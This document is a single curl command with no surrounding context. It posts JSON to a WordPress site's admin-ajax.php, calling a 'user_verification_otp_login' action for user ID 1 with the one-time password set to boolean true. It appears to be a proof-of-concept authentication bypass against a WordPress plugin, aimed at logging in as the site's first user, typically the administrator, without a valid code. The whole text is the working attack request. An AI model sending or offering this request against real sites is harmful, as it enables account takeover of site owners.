curl -sS -X POST "$BASE/wp-admin/admin-ajax.php" -H "Content-Type: application/json" -d '{"action":"user_verification_otp_login","user_id":1,"otp":true}'
